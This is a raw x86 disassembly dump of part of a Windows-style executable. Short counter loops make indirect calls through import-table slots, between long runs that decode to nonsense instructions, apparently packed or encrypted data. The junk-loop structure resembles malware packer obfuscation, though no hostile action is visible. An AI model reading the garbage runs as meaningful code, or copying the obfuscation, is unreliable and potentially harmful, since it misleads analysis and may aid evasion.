  41274a:	inc    ecx
  41274b:	mov    DWORD PTR ds:0x42fdf6,ecx
  412751:	cmp    DWORD PTR ds:0x42fdf6,0x1c
  412758:	jae    0x41279b
  41275e:	cmp    DWORD PTR ds:0x42fdf6,0x11
  412765:	jne    0x41277c
  41276b:	push   0x5b8f
  412770:	push   DWORD PTR [ebp-0x20]
  412773:	push   DWORD PTR [ebp-0x14]
  412776:	call   DWORD PTR ds:0x42e393
  41277c:	cmp    DWORD PTR ds:0x42fdf6,0x10
  412783:	jne    0x412796
  412789:	mov    ecx,DWORD PTR ds:0x42fdf6
  41278f:	inc    ecx
  412790:	mov    DWORD PTR ds:0x42fdf6,ecx
  412796:	jmp    0x412742
  41279b:	mov    ecx,DWORD PTR [ebp+0x14]
  41279e:	push   esi
  41279f:	xor    DWORD PTR ds:0x42fdee,0x1648
  4127a9:	push   edi
  4127aa:	test   ecx,ecx
  4127ac:	jmp    0x412a90
  4127b1:	mov    ds:0xc112c158,eax
  4127b6:	mov    cl,0x73
  4127b8:	jne    0x4127c0
  4127ba:	jne    0x4127b4
  4127bc:	sub    edx,DWORD PTR [edi-0x379db492]
  4127c2:	pop    ecx
  4127c3:	jo     0x412835
  4127c5:	mov    ecx,0x4b70707e
  4127ca:	fistp  WORD PTR [esi-0x25]
  4127cd:	pop    edx
  4127ce:	int    0x6
  4127d0:	mov    esp,0xe9db5521
  4127d5:	(bad)  
  4127d6:	loopne 0x4127fd
  4127d8:	cmp    DWORD PTR [esi],0x885afe8a
  4127de:	mov    ebp,0xcb7c54dd
  4127e3:	nop
  4127e4:	sbb    eax,0x7e12a188
  4127e9:	cwde   
  4127ea:	add    dh,bl
  4127ec:	ja     0x41278e
  4127ee:	inc    edx
  4127ef:	sbb    eax,0x7c7bf0ec
  4127f4:	xchg   esp,eax
  4127f5:	cdq    
  4127f6:	inc    edi
  4127f7:	fldenv [ebp+eiz*2+0x7146c3ca]
  4127fe:	fld    TBYTE PTR [ecx+0x593f8c33]
  412804:	sti    
  412805:	dec    edx
  412806:	pop    ss
  412807:	mov    cl,BYTE PTR [ecx+0x27]
  41280a:	sti    
  41280b:	dec    eax
  41280c:	jae    0x41287d
  41280e:	(bad)  
  41280f:	mov    ds:0x75f73c3d,al
  412814:	xchg   esi,eax
  412815:	imul   edx,ebp,0x82f3d736
  41281b:	xchg   cl,dh
  41281d:	cld    
  41281e:	gs sub ebx,0xffffff87
  412822:	sub    eax,0x30d77c9c
  412827:	(bad)  
  412828:	pushf  
  412829:	xor    BYTE PTR [esi+ebx*2-0x28],al
  41282d:	push   es
  41282e:	dec    ebx
  41282f:	ja     0x41288b
  412831:	adc    al,0x9f
  412833:	test   eax,0xce837aea
  412838:	mov    bh,0xfa
  41283a:	lods   al,BYTE PTR ds:[esi]
  41283b:	cli    
  41283c:	std    
  41283d:	xor    eax,0xe71120e6
  412842:	jg     0x4128a8
  412844:	sub    DWORD PTR [edx],0xffffffb6
  412847:	mov    bh,BYTE PTR ds:[esi]
  41284a:	fidivr DWORD PTR [ebx-0x45]
  41284d:	imul   ecx,DWORD PTR [ecx+0x5404dd37],0xfcfa1206
  412857:	xchg   ebx,eax
  412858:	out    0x5b,al
  41285a:	out    dx,eax
  41285b:	adc    ch,dl
  41285d:	mov    ebp,0x4895b049
  412862:	jmp    0x41283d
  412864:	fld    TBYTE PTR [ecx]
  412866:	mov    ah,0x27
  412868:	pop    esi
  412869:	sbb    bh,BYTE PTR [ebp+0x6]
  41286c:	fsubr  QWORD PTR [ebx]
  41286e:	adc    eax,eax
  412870:	and    al,0xfb
  412872:	ss push esi
  412874:	fs xor dl,cl
  412877:	dec    ebp
  412878:	push   esi
  412879:	stc    
  41287a:	add    al,0xe
  41287c:	int3   
  41287d:	test   eax,0xf9780059
  412882:	stos   BYTE PTR es:[edi],al
  412883:	pop    ss
  412884:	push   ebp
  412885:	mov    ds:0x667a576d,al
  41288a:	frstor [esi-0x3303b4f7]
  412890:	ds cmc 
  412892:	aas    
  412893:	jb     0x41285f
  412895:	jp     0x4128b8
  412897:	dec    ebp
  412898:	addr16 retf 
  41289a:	pop    edx
  41289b:	mov    al,ds:0x14eb6cd8
  4128a0:	imul   esp,DWORD PTR [eax+edx*2+0xf],0xffffffd3
  4128a5:	leave  
  4128a6:	mov    DWORD PTR [edi],edi
  4128a8:	mov    dh,dl
  4128aa:	jns    0x41290d
  4128ac:	lahf   
  4128ad:	shl    BYTE PTR [eax-0x20],1
  4128b0:	stc    
  4128b1:	lods   al,BYTE PTR ds:[esi]
  4128b2:	sar    al,1
  4128b4:	sub    dh,ah
  4128b6:	push   es
  4128b7:	and    al,0x1
  4128b9:	push   ebx
  4128ba:	loopne 0x4128ab
  4128bc:	int3   
  4128bd:	call   0xf2d2:0xc1451100
  4128c4:	cdq    
  4128c5:	jae    0x41286b
  4128c7:	jno    0x41284e
  4128c9:	cli    
  4128ca:	inc    edx
  4128cb:	mov    ah,0x3b
  4128cd:	mov    dh,0x3b
  4128cf:	ins    DWORD PTR es:[edi],dx
  4128d0:	push   esp
  4128d1:	mov    DWORD PTR [ecx-0x1d],ecx
  4128d4:	frstor [ecx-0x29]
  4128d7:	ret    
  4128d8:	pop    ss
  4128d9:	ret    
  4128da:	(bad)  
  4128db:	cmp    ebp,ebp
  4128dd:	pop    edx
  4128de:	(bad)  
  4128df:	in     eax,dx
  4128e0:	rol    DWORD PTR [eax-0x54],0xf7
  4128e4:	xchg   esi,eax
  4128e5:	les    esp,FWORD PTR [edi-0x5d44c491]
  4128eb:	fdivr  QWORD PTR [eax-0x12]
  4128ee:	push   esi
  4128ef:	mov    ds:0x6e99fc50,eax
  4128f4:	ret    0x1c5f
  4128f7:	in     al,dx
  4128f8:	push   ebp
  4128f9:	fimul  WORD PTR [esi]
  4128fb:	ins    DWORD PTR es:[edi],dx
  4128fc:	xchg   ebx,eax
  4128fd:	je     0x412941
  4128ff:	inc    ebp
  412900:	shr    BYTE PTR [ebx-0x4c510a59],0x9c
  412907:	xchg   BYTE PTR [ebx+0x44dc4351],dh
  41290d:	mov    ebx,0xef3afe34
  412912:	pop    ecx
  412913:	push   sp
  412915:	out    0x1f,eax
  412917:	and    al,BYTE PTR [eax+0x33]
  41291a:	test   BYTE PTR [ebx+0x49],bl
  41291d:	aad    0x77
  41291f:	mov    cs,WORD PTR ds:0x6fb72a06
  412925:	lods   eax,DWORD PTR ds:[esi]
  412926:	retf   0x4fd0
  412929:	(bad)  
  41292a:	call   DWORD PTR [esp+ebp*8+0x48cc8c0f]
  412931:	inc    edi
  412932:	inc    edi
  412933:	xchg   esi,eax
  412934:	jge    0x412970
  412936:	xchg   DWORD PTR [edx+0x7c25d170],edx
  41293c:	mov    bh,0x1a
  41293e:	mov    BYTE PTR [edx+ecx*2+0x67],0x5d
  412943:	out    0x25,al
  412945:	inc    ecx
  412946:	mov    dh,0x4a
  412948:	fcomp  DWORD PTR [eax+0x7efb650f]
  41294e:	sahf   
  41294f:	cmp    edi,DWORD PTR [edx+0x16a6fa7]
  412955:	xor    DWORD PTR [edi-0x1f],ecx
  412958:	ret    0xe708
  41295b:	mov    DWORD PTR [edx+0x32512319],ecx
  412961:	jle    0x4129bc
  412963:	loope  0x412933
  412965:	mov    edi,0x377e53dc
  41296a:	mov    cl,0xad
  41296c:	sti    
  41296d:	jo     0x41299f
  41296f:	pop    es
  412970:	sbb    BYTE PTR [edi+0x423ddddc],0xc3
  412977:	cmc    
  412978:	ins    BYTE PTR es:[edi],dx
  412979:	pusha  
  41297a:	and    al,0x80
  41297c:	dec    esp
  41297d:	and    BYTE PTR ds:[ebp+0x476fb683],0x9f
  412985:	pop    edi
  412986:	pop    ebp
  412987:	sub    DWORD PTR [edx+0x43f55436],ecx
  41298d:	mov    eax,ds:0x3c6a684
  412992:	ficomp DWORD PTR [edx-0x7b]
  412995:	pop    ecx
  412996:	pop    esp
  412997:	jne    0x4129ad
  412999:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41299a:	aam    0x5d
  41299c:	data16 into 
  41299e:	sbb    eax,0x67d3375c
  4129a3:	idiv   DWORD PTR [edi-0xf]
  4129a6:	add    eax,0xe0851d83
  4129ab:	jp     0x412931
  4129ad:	mov    ecx,edi
  4129af:	ins    BYTE PTR es:[edi],dx
  4129b0:	repnz icebp 
  4129b2:	push   esp
  4129b4:	cwde   
  4129b5:	es or  al,0x3d
  4129b8:	inc    esi
  4129b9:	ret    
  4129ba:	in     al,dx
  4129bb:	xchg   DWORD PTR [edx-0x7e],ebp
  4129be:	dec    esp
  4129bf:	pop    ebx
  4129c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129c1:	fisubr WORD PTR [esi]
  4129c3:	das    
  4129c4:	jmp    0x412a25
  4129c6:	xchg   esp,eax
  4129c7:	rol    edx,1
  4129c9:	data16 cs (bad) 
  4129cc:	lods   al,BYTE PTR ds:[esi]
  4129cd:	outs   dx,DWORD PTR ds:[esi]
  4129ce:	into   
  4129cf:	mov    edi,DWORD PTR [ebp+0x2c]
  4129d2:	mov    bl,0xc9
  4129d4:	and    BYTE PTR [edx+esi*2-0xc],dl
  4129d8:	xchg   edx,eax
  4129d9:	jmp    0xb0a:0xce83434c
  4129e0:	sbb    edx,DWORD PTR [edi+0x1a]
  4129e3:	or     BYTE PTR [ecx-0xe],0x78
  4129e7:	das    
  4129e8:	aas    
  4129e9:	push   eax
  4129ea:	pop    ds
  4129eb:	stc    
  4129ec:	dec    ah
  4129ee:	mov    ah,0x31
  4129f0:	and    DWORD PTR [edx+ebp*8],0x43
  4129f4:	(bad)  
  4129f5:	push   cs
  4129f6:	out    0x0,eax
  4129f8:	dec    edx
  4129f9:	push   esi
  4129fa:	mul    edx
  4129fc:	loopne 0x4129b8
  4129fe:	neg    BYTE PTR [ebp-0x26dcd051]
  412a04:	js     0x4129b3
  412a06:	mov    dh,0x60
  412a08:	jbe    0x412a7c
  412a0a:	dec    ecx
  412a0b:	lds    esp,FWORD PTR [esi-0x5ab80921]
  412a11:	mov    ebx,DWORD PTR [eax]
  412a13:	mov    eax,0x2d79daa7
  412a18:	hlt    
  412a19:	jg     0x41299d
  412a1b:	stos   DWORD PTR es:[edi],eax
  412a1c:	push   0xe5c7011a
  412a21:	add    ebp,ecx
  412a23:	retf   0x5966
  412a26:	mov    ds:0xa7ca199d,eax
  412a2b:	dec    esi
  412a2c:	scas   eax,DWORD PTR es:[edi]
  412a2d:	jne    0x412a03
  412a2f:	and    DWORD PTR [eax],esi
  412a31:	adc    eax,0x74a8254a
  412a36:	in     eax,dx
  412a37:	lds    esp,FWORD PTR [esp+esi*2+0x5d841fe1]
  412a3e:	push   0x65
  412a40:	mov    ecx,0xe75ef618
  412a45:	(bad)  
  412a47:	in     eax,0x84
  412a49:	imul   ecx,ecx,0x12224377
  412a4f:	push   esp
  412a50:	xchg   BYTE PTR [esi+0x4bb2a30b],ah
  412a56:	data16 cmp bh,ah
  412a59:	xchg   ecx,eax
  412a5a:	outs   dx,DWORD PTR ds:[esi]
  412a5b:	cld    
  412a5c:	mov    dl,0x7c
  412a5e:	jle    0x412acb
  412a60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a61:	cdq    
  412a62:	dec    eax
  412a63:	mov    ?,ecx
  412a65:	add    al,0x1c
  412a67:	push   esi
  412a68:	jle    0x412a47
  412a6a:	sub    bl,BYTE PTR [edx]
  412a6c:	rcl    bh,0x2e
  412a6f:	in     al,dx
  412a70:	and    BYTE PTR [edi-0x743755c8],bh
  412a76:	out    dx,al
  412a77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a78:	icebp  
  412a79:	std    
  412a7a:	fidiv  DWORD PTR [eax+0x1cd02a37]
  412a80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a81:	(bad)  
  412a82:	rcl    BYTE PTR [ecx],cl
  412a84:	fs inc esp
  412a86:	cdq    
  412a87:	push   eax
  412a88:	cmp    bl,BYTE PTR [edx+0x724f232]
  412a8e:	mov    dh,0x3f
  412a90:	je     0x412aa6
  412a96:	mov    ecx,DWORD PTR [ebp+0x14]
  412a99:	add    edi,DWORD PTR ds:0x42e1a0
  412a9f:	mov    ecx,DWORD PTR [ecx]
  412aa1:	or     esi,esi
  412aa3:	mov    DWORD PTR [ebp-0x1c],ecx
  412aa6:	mov    DWORD PTR ds:0x42fd75,0x17
  412ab0:	cmp    DWORD PTR ds:0x42fd75,0x0
  412ab7:	je     0x412b09
  412abd:	cmp    DWORD PTR ds:0x42fd75,0x24
  412ac4:	jne    0x412af1
  412aca:	push   0x5fda
  412acf:	push   0x42de
  412ad4:	push   0x6b28
  412ad9:	push   0x4e0a
  412ade:	push   DWORD PTR [ebp-0x10]
  412ae1:	push   0x8dcd
  412ae6:	push   0x86d4
  412aeb:	call   DWORD PTR ds:0x42e397
  412af1:	mov    edi,DWORD PTR ds:0x42fd75
  412af7:	dec    edi
  412af8:	mov    DWORD PTR ds:0x42fd75,edi
  412afe:	jmp    0x412ab0
  412b03:	and    ecx,DWORD PTR ds:0x42e1a8
  412b09:	imul   edx,eax
  412b0c:	mov    ecx,0x4573
  412b11:	add    DWORD PTR ds:0x42e198,edx
  412b17:	add    edx,ecx
  412b19:	mov    esi,0x7879
  412b1e:	sub    edi,0x22a0
  412b24:	mov    edi,0x1556
  412b29:	jmp    0x412e0d
  412b2e:	retf   
  412b2f:	sbb    eax,eax
  412b31:	inc    esp
  412b32:	loopne 0x412ba7
  412b34:	push   ebx
  412b35:	mov    bl,0x1a
  412b37:	ror    BYTE PTR [edi],cl
  412b39:	ja     0x412b44
  412b3b:	popa   
  412b3c:	test   cl,ch
  412b3e:	adc    DWORD PTR [esi+0x70],esp
  412b41:	jo     0x412afc
  412b43:	jle    0x412bb5
  412b45:	jo     0x412b99
  412b47:	mov    ch,0x94
  412b49:	cmp    eax,0x442e7265
  412b4e:	jp     0x412b73
  412b50:	repz out 0xc5,al
  412b53:	sbb    BYTE PTR [eax-0x4902ebf3],dh
  412b59:	cmp    BYTE PTR [ebp+0x5ae67c91],bh
  412b5f:	jne    0x412bbc
  412b61:	sub    dh,BYTE PTR [eax+0xa]
  412b64:	mov    ds:0x82c38e47,eax
  412b69:	mov    al,ds:0xa43cb918
  412b6e:	rcr    eax,cl
  412b70:	ins    DWORD PTR es:[edi],dx
  412b71:	arpl   WORD PTR [ebp-0x72906382],si
  412b77:	add    BYTE PTR [edx+0x170a4544],dh
  412b7d:	daa    
  412b7e:	repz mov edx,0xb7e71b96
  412b84:	inc    eax
  412b85:	add    al,0x58
  412b87:	jbe    0x412b92
  412b89:	cs int 0xa2
  412b8c:	in     al,0xb3
  412b8e:	xor    bh,ah
  412b90:	test   eax,0x9cd7655b
  412b95:	rcl    DWORD PTR [eax],cl
  412b97:	or     DWORD PTR [ebp+esi*2+0x5d9b6612],edx
  412b9e:	xchg   esi,eax
  412b9f:	push   0x205a8de3
  412ba4:	mov    esp,0xd8c3eb
  412ba9:	sub    al,0x41
  412bab:	mov    ebp,0x8ef048e9
  412bb1:	out    dx,eax
  412bb2:	xchg   edi,eax
  412bb3:	jae    0x412b6d
  412bb5:	rcr    BYTE PTR [ebp-0x21],cl
  412bb8:	push   ebp
  412bb9:	mov    bh,BYTE PTR [ebx-0x2b6f5247]
  412bbf:	lahf   
  412bc0:	xchg   ebx,eax
  412bc1:	pop    ds
  412bc2:	add    eax,0xfbfa5ab1
  412bc7:	xlat   BYTE PTR ds:[ebx]
  412bc8:	xor    al,BYTE PTR [ebp-0x6a]
  412bcb:	mov    DWORD PTR [esp+ebp*4-0xbff7229],ebx
  412bd2:	leave  
  412bd3:	xchg   edx,eax
  412bd4:	jns    0x412b67
  412bd6:	push   ebp
  412bd7:	xor    al,0xa0
  412bda:	popa   
  412bdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bdc:	push   cs
  412bdd:	lahf   
  412bde:	inc    eax
  412bdf:	push   eax
  412be0:	dec    edi
  412be1:	test   eax,0x73d632dc
  412be6:	test   ch,ch
  412be8:	out    0xe1,eax
  412bea:	stos   DWORD PTR es:[edi],eax
  412beb:	jmp    0xedfb033e
  412bf0:	push   edx
  412bf1:	or     DWORD PTR [esi+edx*2-0x49],0x5467f17b
  412bf9:	cwde   
  412bfa:	jecxz  0x412c6c
  412bfc:	xchg   ecx,eax
  412bfd:	xor    DWORD PTR [eax+0x19],eax
  412c00:	push   ecx
  412c01:	xor    DWORD PTR [ecx+0x55400bf6],esp
  412c07:	fwait
  412c08:	les    esi,FWORD PTR [eax]
  412c0a:	sbb    dl,bl
  412c0c:	cdq    
  412c0d:	adc    eax,0x8f8d76db
  412c12:	retf   
  412c13:	mov    dh,0x3b
  412c15:	mov    ebp,0xa3299119
  412c1a:	or     dl,BYTE PTR [ebx+0x4]
  412c1d:	xchg   esp,eax
  412c1e:	push   esi
  412c1f:	cwde   
  412c20:	jbe    0x412c36
  412c22:	not    DWORD PTR [ecx+0xfa32e23]
  412c28:	mov    WORD PTR [esi],ds
  412c2a:	div    dl
  412c2c:	pop    ss
  412c2d:	jp     0x412c01
  412c2f:	fnstsw WORD PTR ds:[edx+0x34]
  412c33:	clc    
  412c34:	mov    bh,0x72
  412c36:	enter  0xfa61,0x20
  412c3a:	rol    BYTE PTR [eax-0x77],cl
  412c3d:	rol    DWORD PTR [edi+0x706133e7],cl
  412c43:	push   esi
  412c44:	fimul  DWORD PTR ds:0x6ac8092d
  412c4a:	pop    ds
  412c4b:	arpl   WORD PTR [ebx-0x11],cx
  412c4e:	inc    esi
  412c4f:	mov    dh,0x6b
  412c51:	xchg   edx,eax
  412c52:	ret    
  412c53:	mov    WORD PTR [edx],ss
  412c55:	add    DWORD PTR [ebp+0x354e6262],edx
  412c5b:	push   esp
  412c5c:	xchg   edi,ebp
  412c5e:	scas   eax,DWORD PTR es:[edi]
  412c5f:	xlat   BYTE PTR ds:[ebx]
  412c60:	(bad)  
  412c61:	xchg   edx,eax
  412c62:	rcr    BYTE PTR [ecx-0x72],0x89
  412c66:	retf   
  412c67:	push   ecx
  412c68:	push   DWORD PTR [edx]
  412c6a:	and    al,0xc0
  412c6c:	cmp    al,0xa6
  412c6e:	sbb    BYTE PTR [ecx],0x87
  412c71:	or     al,0x17
  412c73:	xor    DWORD PTR [eax+0x44],0x65
  412c77:	inc    edi
  412c78:	pop    ebp
  412c79:	loopne 0x412c6e
  412c7b:	mov    al,ds:0x7110bade
  412c80:	add    ecx,DWORD PTR [edi]
  412c82:	push   ebp
  412c83:	push   edi
  412c84:	push   ecx
  412c85:	sub    ch,BYTE PTR [ecx+0x61]
  412c88:	push   ds
  412c89:	call   0x58f82ea1
  412c8e:	dec    esi
  412c8f:	lds    esp,FWORD PTR [edx]
  412c91:	jmp    0xefd93f55
  412c96:	jae    0x412cd2
  412c98:	or     eax,0x85c3f1ce
  412c9d:	mov    cl,0x2
  412c9f:	imul   esp,DWORD PTR [esp+ecx*8],0xffffff83
  412ca3:	fcomp  QWORD PTR [eax+0x67fd9bd3]
  412ca9:	jmp    0x9e5a:0x9b1efc25
  412cb0:	inc    esi
  412cb1:	pop    ds
  412cb2:	fsub   QWORD PTR [ecx-0x1d]
  412cb5:	loope  0x412c51
  412cb7:	jl     0x412c78
  412cb9:	jae    0x412d1f
  412cbb:	mov    esp,0xd85fb925
  412cc0:	inc    edx
  412cc1:	gs pop edi
  412cc3:	out    dx,eax
  412cc4:	or     BYTE PTR [ebp+0x42],bl
  412cc7:	shr    BYTE PTR [edx],cl
  412cc9:	adc    eax,0x4f9254fb
  412cce:	enter  0x2bf8,0xd1
  412cd2:	mov    DWORD PTR [ebp-0x19cec75],edx
  412cd8:	pusha  
  412cd9:	sub    esi,edx
  412cdb:	mov    ds:0xebf5d51d,al
  412ce0:	aas    
  412ce1:	enter  0xd55,0x9d
  412ce5:	scas   eax,DWORD PTR es:[edi]
  412ce6:	pop    edi
  412ce7:	mov    BYTE PTR [edi-0x1c],dl
  412cea:	mov    al,ds:0x972480c9
  412cef:	ret    
  412cf0:	(bad)  
  412cf1:	dec    ecx
  412cf2:	aas    
  412cf3:	and    al,0xa2
  412cf5:	jo     0x412cc3
  412cf7:	dec    edx
  412cf8:	ins    BYTE PTR es:[edi],dx
  412cf9:	js     0x412ca8
  412cfb:	sub    al,0x1
  412cfd:	push   ss
  412cfe:	sub    DWORD PTR [eax-0x5380d514],esp
  412d04:	push   edx
  412d05:	mul    BYTE PTR [edx-0x388906e2]
  412d0b:	imul   ebp,DWORD PTR [ebp+0x74],0xe4234422
  412d12:	adc    eax,0x3b0c8c95
  412d17:	pop    es
  412d18:	inc    edi
  412d19:	mov    ecx,DWORD PTR [esp+eiz*2-0x1]
  412d1d:	jo     0x412d13
  412d1f:	ss ret 
  412d21:	dec    edi
  412d22:	mov    ch,0x47
  412d24:	or     eax,0x23115208
  412d29:	pop    ds
  412d2a:	sub    bh,BYTE PTR [ecx]
  412d2c:	and    esi,DWORD PTR [edi-0x6ba46958]
  412d32:	or     BYTE PTR [eax-0x37332bc2],dl
  412d38:	pusha  
  412d39:	aad    0x86
  412d3b:	out    0xcb,eax
  412d3d:	loope  0x412d6a
  412d3f:	push   ecx
  412d40:	pop    esi
  412d41:	div    ecx
  412d43:	ret    0x1279
  412d46:	lock inc ebx
  412d48:	pusha  
  412d49:	in     eax,0x91
  412d4b:	repz jp 0x412d13
  412d4e:	ss mov ah,0xd2
  412d51:	fld    st(6)
  412d53:	cmc    
  412d54:	sub    al,0xcc
  412d56:	imul   ebx,edi,0xffffff93
  412d59:	jb     0x412d94
  412d5b:	push   esp
  412d5c:	or     DWORD PTR gs:[ecx-0x591e3de8],edx
  412d63:	pop    ebp
  412d64:	mov    esp,0x66072661
  412d69:	jg     0x412d3f
  412d6b:	ficom  DWORD PTR [ecx-0x79]
  412d6e:	lahf   
  412d6f:	jb     0x412d1f
  412d71:	mov    edi,0x74af0cb5
  412d76:	icebp  
  412d77:	js     0x412d8a
  412d79:	jmp    0x6101ba4b
  412d7e:	push   ds
  412d7f:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  412d81:	iret   
  412d82:	sub    DWORD PTR [eax+ebx*2+0x6f],edi
  412d86:	mov    ah,0x19
  412d88:	mov    al,0xce
  412d8a:	mov    dl,0x49
  412d8c:	sbb    BYTE PTR [esi],ah
  412d8e:	mov    ds:0x5459de29,al
  412d93:	xchg   ebp,eax
  412d94:	retf   
  412d95:	xor    DWORD PTR [edi+0x6a9ee0d9],esi
  412d9b:	jl     0x412d20
  412d9d:	mov    DWORD PTR [edi],esp
  412d9f:	adc    edx,edx
  412da1:	jo     0x412df3
  412da3:	scas   eax,DWORD PTR es:[edi]
  412da4:	arpl   dx,bp
  412da6:	add    eax,DWORD PTR [esp+ebp*8+0x47]
  412daa:	out    0x9a,al
  412dac:	xor    BYTE PTR [esi-0x52],cl
  412daf:	(bad)
  412db2:	mov    dh,0xb0
  412db4:	mov    ebp,0x1badef14
  412db9:	mov    bl,0x59
  412dbb:	nop
  412dbc:	xor    BYTE PTR [eax],ah
  412dbe:	(bad)  
  412dbf:	cld    
  412dc0:	or     eax,DWORD PTR [eax]
  412dc2:	adc    al,0x37
  412dc4:	daa    
  412dc5:	jnp    0x412e11
  412dc7:	adc    al,0xa8
  412dc9:	pushf  
  412dca:	mov    ds:0xafd5aa45,eax
  412dcf:	push   ecx
  412dd0:	add    eax,0x37c0fbe
  412dd5:	rcr    DWORD PTR [edi+edx*1],1
  412dd8:	sub    DWORD PTR [edx-0x6b],ebp
  412ddb:	rol    DWORD PTR [edi-0x19],0xac
  412ddf:	xchg   esp,eax
  412de0:	pop    ecx
  412de1:	cli    
  412de2:	in     al,0x2f
  412de4:	xchg   esi,eax
  412de5:	scas   al,BYTE PTR es:[edi]
  412de6:	js     0x412da8
  412de8:	lods   eax,DWORD PTR ds:[esi]
  412de9:	pop    esi
  412dea:	mov    ebp,DWORD PTR [edx+0x63d31e8b]
  412df0:	mov    WORD PTR [ebx+0xb],ss
  412df3:	add    edx,edi
  412df5:	xor    eax,0x69175639
  412dfa:	out    dx,eax
  412dfb:	adc    esi,DWORD PTR [ebx-0x73]
  412dfe:	xchg   bl,al
  412e00:	push   es
  412e01:	shl    DWORD PTR [eax],1
  412e03:	stos   DWORD PTR es:[edi],eax
  412e04:	jae    0x412dce
  412e06:	xor    DWORD PTR [ebp-0x78],edi
  412e09:	or     eax,0x876d4a18
  412e0e:	into   
  412e0f:	and    DWORD PTR ds:0x42e19c,0x0
  412e19:	jmp    0x412e2d
  412e1e:	xor    ecx,ecx
  412e20:	add    ecx,DWORD PTR ds:0x42e19c
  412e26:	inc    ecx
  412e27:	mov    DWORD PTR ds:0x42e19c,ecx
  412e2d:	cmp    DWORD PTR ds:0x42e19c,0x17
  412e34:	jae    0x412e60
  412e3a:	cmp    DWORD PTR ds:0x42e19c,0x25
  412e41:	jne    0x412e55
  412e47:	push   0x286f
  412e4c:	push   DWORD PTR [ebp-0x18]
  412e4f:	call   DWORD PTR ds:0x42e507
  412e55:	jmp    0x412e1e
  412e5a:	xor    ecx,0x7ba7
  412e60:	sub    edx,edi
  412e62:	xor    esi,esi
  412e64:	jmp    0x413148
  412e69:	call   0x6aab08c6
  412e6e:	jno    0x412ee7
  412e70:	popa   
  412e71:	push   ebx
  412e72:	xchg   eax,esp
  412e74:	arpl   WORD PTR [edx],ax
  412e76:	push   eax
  412e77:	lock xor DWORD PTR [edx+0x64],ebx
  412e7b:	jo     0x412eed
  412e7d:	mov    ecx,0xde70707e
  412e82:	add    al,0x70
  412e85:	sub    bl,al
  412e87:	inc    eax
  412e88:	fmul   QWORD PTR [ebx]
  412e8a:	dec    edi
  412e8b:	sahf   
  412e8c:	imul   esi,ecx,0xf
  412e8f:	fdiv   DWORD PTR [edi]
  412e91:	outs   dx,DWORD PTR ds:[esi]
  412e92:	adc    DWORD PTR [edx-0x16bd0c82],eax
  412e98:	lds    edx,FWORD PTR ds:0x64d88160
  412e9e:	xchg   edi,eax
  412e9f:	aas    
  412ea0:	sbb    eax,edi
  412ea2:	dec    ecx
  412ea3:	outs   dx,DWORD PTR ds:[esi]
  412ea4:	mov    dh,0x36
  412ea6:	(bad)  
  412ea7:	jne    0x412e60
  412ea9:	mov    eax,0xba7f0fd2
  412eae:	retf   
  412eaf:	scas   al,BYTE PTR es:[edi]
  412eb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412eb1:	aas    
  412eb2:	xchg   ebx,eax
  412eb3:	add    al,0x73
  412eb5:	pop    es
  412eb6:	mov    bl,0xec
  412eb8:	cmc    
  412eb9:	in     al,0xf4
  412ebb:	xlat   BYTE PTR ds:[ebx]
  412ebc:	pushf  
  412ebd:	dec    edx
  412ebe:	pop    ds
  412ebf:	test   al,0x40
  412ec1:	in     al,dx
  412ec2:	stos   BYTE PTR es:[edi],al
  412ec3:	mov    edi,DWORD PTR [esi+0x34d3f1db]
  412ec9:	xor    al,0x25
  412ecb:	test   BYTE PTR fs:[bx+di-0x4fa],bl
  412ed1:	xchg   esp,eax
  412ed2:	fidiv  DWORD PTR [edi]
  412ed4:	dec    ebp
  412ed5:	dec    ebx
  412ed6:	ror    BYTE PTR [edx-0x20335281],1
  412edc:	mov    ecx,0x644b2ecc
  412ee1:	cdq    
  412ee2:	dec    ebp
  412ee3:	cs jecxz 0x412ef4
  412ee6:	ins    BYTE PTR es:[edi],dx
  412ee7:	pop    ds
  412ee8:	jge    0x412e94
  412eea:	mov    dh,0x9c
  412eec:	daa    
  412eed:	clc    
  412eee:	and    dh,BYTE PTR ds:0x7a9018e6
  412ef4:	popf   
  412ef5:	xchg   ebp,eax
  412ef6:	fcomp  st(7)
  412ef8:	inc    edi
  412ef9:	dec    ebx
  412efa:	adc    bh,bl
  412efc:	(bad)  
  412efd:	in     eax,dx
  412efe:	xor    edx,ebp
  412f00:	adc    ebx,ecx
  412f02:	data16 aad 0x5
  412f05:	pop    es
  412f06:	adc    al,0x4b
  412f08:	adc    edx,DWORD PTR [eax]
  412f0a:	pop    ebx
  412f0b:	mov    ds:0xdfe8a411,al
  412f10:	imul   esp,DWORD PTR [eax+ebp*4+0x7f2b0b10],0x46fde6ff
  412f1b:	jl     0x412f42
  412f1d:	sbb    BYTE PTR [ebp-0x15fb6995],dh
  412f23:	adc    eax,0xc6d63917
  412f28:	add    eax,0x3c10d425
  412f2d:	add    cl,BYTE PTR [edi+eiz*8-0x80]
  412f31:	aad    0xd1
  412f33:	cmp    DWORD PTR [eax],esi
  412f35:	mov    WORD PTR [ebx],ds
  412f37:	and    ch,BYTE PTR ds:0x5694ce66
  412f3d:	adc    DWORD PTR [edi+0x2a],eax
  412f40:	adc    ah,BYTE PTR [edi+eiz*2+0x5]
  412f44:	xchg   BYTE PTR [edi],bh
  412f46:	or     BYTE PTR [esi-0x46370233],ah
  412f4c:	and    BYTE PTR [eax-0x5e115271],0xbb
  412f53:	mov    esi,0xd76315e9
  412f58:	jmp    0x819b46cb
  412f5d:	push   esi
  412f5e:	sbb    eax,0x94af552a
  412f63:	mov    DWORD PTR [edx-0x11e0c0f0],esp
  412f69:	cwde   
  412f6a:	and    dl,BYTE PTR [ecx-0x33]
  412f6d:	xchg   edx,eax
  412f6e:	das    
  412f6f:	enter  0x39e8,0xef
  412f73:	ret    0x950
  412f76:	mov    eax,0x7ea3f6dc
  412f7b:	sub    al,0xc5
  412f7d:	xchg   edx,eax
  412f7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f7f:	std    
  412f80:	xchg   ecx,eax
  412f81:	xchg   esi,eax
  412f82:	js     0x412f23
  412f84:	pop    ebx
  412f85:	fs call 0xd564ff27
